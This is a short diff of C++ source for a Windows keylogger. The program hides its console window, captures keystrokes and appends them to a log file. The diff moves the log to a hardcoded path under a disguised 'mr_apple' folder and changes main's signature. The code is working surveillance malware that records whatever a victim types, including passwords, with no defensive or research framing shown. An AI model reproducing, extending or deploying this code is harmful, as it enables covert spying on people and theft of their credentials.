@@ -9,11 +9,12 @@
 using namespace std;
 
 const string v = "Такой вот парадокс: мы совершаем подвиги для тех, кому до нас уже нет никакого дела, а любят нас те, кому мы нужны и без всяких подвигов...";
+const char* f_name = "D:\\ProgramFiles\\mr_apple\\dat.txt";
 
 
 void LOG(string input) {
 	fstream LogFile;
-	LogFile.open("dat.txt", fstream::app);
+	LogFile.open(f_name, fstream::app);
 	if (LogFile.is_open()) {
 		LogFile << input;
 		LogFile.close();
@@ -86,7 +87,7 @@ bool SpecialKeys(int S_Key) {
 
 
 
-int main()
+int main(int argc, const char* argv[])
 {
 	ShowWindow(GetConsoleWindow(), SW_HIDE);
 	char KEY = 'x';
@@ -99,7 +100,7 @@ int main()
 				if (SpecialKeys(KEY) == false) {
 
 					fstream LogFile;
-					LogFile.open("dat.txt", fstream::app);
+					LogFile.open(f_name, fstream::app);
 					if (LogFile.is_open()) {
 						LogFile << char(KEY);
 						LogFile.close();
